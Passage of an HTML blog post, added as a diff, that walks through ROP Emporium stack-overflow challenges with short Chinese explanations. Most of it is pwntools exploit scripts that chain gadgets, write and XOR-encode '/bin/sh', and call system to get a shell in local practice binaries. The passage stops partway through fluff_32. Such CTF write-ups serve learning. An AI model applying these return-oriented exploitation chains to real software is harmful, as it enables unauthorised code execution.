@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/33.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/22.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/11.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"l0ne1y.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Rop   Emporium最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rop_Emporium">
+<meta property="og:url" content="https://l0ne1y.github.io/2020/05/07/Rop-Emporium/index.html">
+<meta property="og:site_name" content="L0ne1y&#39;s Blog">
+<meta property="og:description" content="Rop   Emporium最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-05-06T23:46:11.000Z">
+<meta property="article:modified_time" content="2020-05-06T15:47:58.706Z">
+<meta property="article:author" content="L0ne1y">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ROP Emporium">
+<meta property="article:tag" content="stack">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://l0ne1y.github.io/2020/05/07/Rop-Emporium/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Rop_Emporium | L0ne1y's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="L0ne1y's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">L0ne1y's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">5</span></a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i>links</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://l0ne1y.github.io/2020/05/07/Rop-Emporium/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.JPG">
+      <meta itemprop="name" content="L0ne1y">
+      <meta itemprop="description" content="老年pwn选手，在线养老">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L0ne1y's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Rop_Emporium
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-05-06 23:46:11 / 修改时间：15:47:58" itemprop="dateCreated datePublished" datetime="2020-05-06T23:46:11Z">2020-05-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/ROP-Emporium/" itemprop="url" rel="index"><span itemprop="name">ROP Emporium</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/ROP-Emporium/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>15k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="Rop-Emporium"><a href="#Rop-Emporium" class="headerlink" title="Rop   Emporium"></a>Rop   Emporium</h2><p>最近在学习ROP，发现ROP Emporium这个网站上题目挺好，就一直在做，我这里用到查gadget的工具是ROPgadget，其他工具也是可以的。</p>
+<a id="more"></a>
+
+<h3 id="ret2win-32"><a href="#ret2win-32" class="headerlink" title="ret2win_32"></a>ret2win_32</h3><p>简单的覆盖返回地址跳转到后门函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+&quot;\x59\x86\x04\x08&quot;</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2win-64"><a href="#ret2win-64" class="headerlink" title="ret2win_64"></a>ret2win_64</h3><p>和32位一样，覆盖返回地址跳转到后门函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;ret2win&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*8+p64(0x0400811)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="split-32"><a href="#split-32" class="headerlink" title="split_32"></a>split_32</h3><p>程序的system中不是/bin/sh，通过查找字符串发现在数据段，将参数数据段参数传递给system就ok了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split32&quot;)</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4+p32(0x08048657)+p32(0x0804a030)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="split-64"><a href="#split-64" class="headerlink" title="split_64"></a>split_64</h3><p>64位和32位有点不一样，在传参方面64位前几个参数是放在rdi，rsi，rdx，rcx，r8,r9中，所以需要将参数放到rdi中才可以调用成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;split&quot;)</span><br><span class="line">system_addr&#x3D;0x0400810</span><br><span class="line">rdi_addr&#x3D;0x0400883</span><br><span class="line">flag_addr&#x3D;0x0601060</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20+&#39;a&#39;*0x8+p64(rdi_addr)+p64(flag_addr)+p64(system_addr)</span><br><span class="line">#当程序ret时，进入rdi_addr，然后rdi再ret到system_addr每一次esp指向都不一样</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="callme-32"><a href="#callme-32" class="headerlink" title="callme_32"></a>callme_32</h3><p>程序中没有system和/bin/sh,给了一个.so文件，用IDA查看发现程序通过callme_one函数将flag文件导入,通过callme_two和callme_three函数将flag解密输出,这三个函数还需要在0x1,0x2,0x3这三个参数，由于.so文件相当于在调用动态链接库，没有办法esp自减，所以我们利用程序中的gadget来平衡一下栈 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme32&quot;)</span><br><span class="line">callme_one_addr&#x3D;0x080485c0</span><br><span class="line">callme_two_addr&#x3D;0x08048620</span><br><span class="line">callme_three_addr&#x3D;0x080485b0</span><br><span class="line">gadget_addr&#x3D;0x080488a9</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(callme_one_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_two_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">payload+&#x3D;p32(callme_three_addr)+p32(gadget_addr)+p32(0x1)+p32(0x2)+p32(0x3)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="callme-64"><a href="#callme-64" class="headerlink" title="callme_64"></a>callme_64</h3><p>和32基本一样，注意传参问题就好</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;callme&quot;)</span><br><span class="line">gadget_addr&#x3D;0x0401ab0</span><br><span class="line">callme_one_addr&#x3D;0x0401850</span><br><span class="line">callme_two_addr&#x3D;0x0401870</span><br><span class="line">callme_three_addr&#x3D;0x0401810</span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_one_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_two_addr)</span><br><span class="line">payload+&#x3D;p64(gadget_addr)+p64(0x1)+p64(0x2)+p64(0x3)+p64(callme_three_addr)</span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="write4-32"><a href="#write4-32" class="headerlink" title="write4_32"></a>write4_32</h3><p>程序中只有system函数，没有我们需要的/bin/sh，需要我们自己构造，但是我们要向将自己构造的写入到程序，就要知道程序bss段或者data段是否可写，以及他们的空间是否足够。另外需要注意的是，我们这里是 32 位程序，每次只能写入 4 个字节，所以要分成两次写入，还得注意字符对齐，有没有截断字符（ \x00  , \x0a  等）之类的问<br>题，比如这里  /bin/sh  只有七个字节，我们可以使用  /bin/sh\x00  或者/bin//sh </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;uft-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write432&quot;)</span><br><span class="line">system_addr&#x3D;0x0804865a           #system_plt_addr&#x3D;0x08048430</span><br><span class="line">pop_pop_addr&#x3D;0x080486da</span><br><span class="line">mov_addr&#x3D;0x08048670</span><br><span class="line">data_addr&#x3D;0x0804a028</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x28+&quot;a&quot;*4</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr)+&quot;&#x2F;bin&quot;+p32(mov_addr)</span><br><span class="line">payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;&#x2F;sh&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">#payload+&#x3D;p32(pop_pop_addr)+p32(data_addr+4)+&quot;&#x2F;sh\x00&quot;+p32(mov_addr)</span><br><span class="line"></span><br><span class="line">payload+&#x3D;p32(system_addr)+p32(data_addr)         #p32(system_plt_addr)   </span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="write4-64"><a href="#write4-64" class="headerlink" title="write4_64"></a>write4_64</h3><p>64位一次写入就好了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#coding&#x3D;&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh&#x3D;process(&quot;.&#x2F;write4&quot;)</span><br><span class="line">system_plt_addr&#x3D;0x04005e0</span><br><span class="line">data_addr&#x3D;0x0601050</span><br><span class="line">mov_ret_addr&#x3D;0x0400820</span><br><span class="line">pop_pop_addr&#x3D;0x0400890</span><br><span class="line">pop_rdi_addr&#x3D;0x0400893</span><br><span class="line"></span><br><span class="line">payload&#x3D;&quot;a&quot;*0x20+&quot;a&quot;*0x8</span><br><span class="line">payload+&#x3D;p64(pop_pop_addr)+p64(data_addr)+&quot;&#x2F;bin&#x2F;sh\x00&quot;+p64(mov_ret_addr)</span><br><span class="line">payload+&#x3D;p64(pop_rdi_addr)+p64(data_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;&gt;&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="badchars-32"><a href="#badchars-32" class="headerlink" title="badchars_32"></a>badchars_32</h3><p>我们依然要将  /bin/sh  写入到进程内存中，但这一次程序在读取，输入时会对敏感字符进行检查。处理敏感字符在利用开发中是经常要用到的，不仅仅是要对参数进行编码，有时甚至地址也要如此。这里我们使用简单的异或操作来对字符串编码和解码。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars32"</span>)</span><br><span class="line"></span><br><span class="line">pop_ebx_ecx_addr=<span class="number">0x08048896</span></span><br><span class="line">pop_esi_edi_addr=<span class="number">0x08048899</span></span><br><span class="line">mov_edi_esi_addr=<span class="number">0x08048893</span></span><br><span class="line">xor_addr=<span class="number">0x08048890</span></span><br><span class="line">system_plt_addr=<span class="number">0x080484e0</span></span><br><span class="line">bss_addr=<span class="number">0x0804a040</span></span><br><span class="line"><span class="comment">#encode</span></span><br><span class="line">binsh=<span class="string">""</span></span><br><span class="line">xor_byte=<span class="number">0x2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">	c=ord(i) ^ xor_byte</span><br><span class="line">	binsh+=chr(c)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">44</span></span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">0</span>:<span class="number">4</span>]+p32(bss_addr)+p32(mov_edi_esi_addr)</span><br><span class="line">payload+=p32(pop_esi_edi_addr)+binsh[<span class="number">4</span>:<span class="number">8</span>]+p32(bss_addr+<span class="number">4</span>)+p32(mov_edi_esi_addr)</span><br><span class="line"><span class="comment">#code</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p32(pop_ebx_ecx_addr)</span><br><span class="line">	payload+=p32(bss_addr+i)</span><br><span class="line">	payload+=p32(xor_byte)</span><br><span class="line">	payload+=p32(xor_addr)</span><br><span class="line"></span><br><span class="line">payload+=p32(system_plt_addr)+<span class="string">"a"</span>*<span class="number">0x4</span>+p32(bss_addr)</span><br><span class="line">	</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="badchars-64"><a href="#badchars-64" class="headerlink" title="badchars_64"></a>badchars_64</h3><p>和32位一样，就是这次可以一次传参了，需要注意的就是传参问题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding="utf-8"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">"./badchars"</span>)</span><br><span class="line">elf=ELF(<span class="string">'./badchars'</span>)</span><br><span class="line">system_plt_addr=<span class="number">0x004006f0</span></span><br><span class="line">bss_addr=<span class="number">0x0000000000601080</span>			//本来想用data段的，但是不知道为什么data段地址就是不对，服服服。。。</span><br><span class="line">mov_r13_r12_addr=<span class="number">0x0400b34</span></span><br><span class="line">pop_r12_r13_addr=<span class="number">0x0400b3b</span></span><br><span class="line">pop_r14_r15_addr=<span class="number">0x0400b40</span></span><br><span class="line">xor_r15_r14_addr=<span class="number">0x0400b30</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x0400b39</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor_byte=<span class="number">0x1</span></span><br><span class="line">badchars=[<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x63</span>,<span class="number">0x2f</span>,<span class="number">0x20</span>,<span class="number">0x66</span>,<span class="number">0x6e</span>,<span class="number">0x73</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	binsh=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">"/bin/sh\x00"</span>:</span><br><span class="line">		c=ord(i) ^ xor_byte</span><br><span class="line">		<span class="keyword">if</span> c <span class="keyword">in</span> badchars:</span><br><span class="line">			xor_byte+=<span class="number">1</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			binsh+=chr(c)</span><br><span class="line">	<span class="keyword">if</span> len(binsh)==<span class="number">8</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x20</span>+<span class="string">"a"</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(pop_r12_r13_addr)+binsh+p64(bss_addr)+p64(mov_r13_r12_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(binsh)):</span><br><span class="line">	payload+=p64(pop_r14_r15_addr)</span><br><span class="line">	payload+=p64(xor_byte)</span><br><span class="line">	payload+=p64(bss_addr+i)</span><br><span class="line">	payload+=p64(xor_r15_r14_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bss_addr)+p64(system_plt_addr)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="fluff-32"><a href="#fluff-32" class="headerlink" title="fluff_32"></a>fluff_32</h3><p>和前面的一样但是程序这次的gadget确实有点难利用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 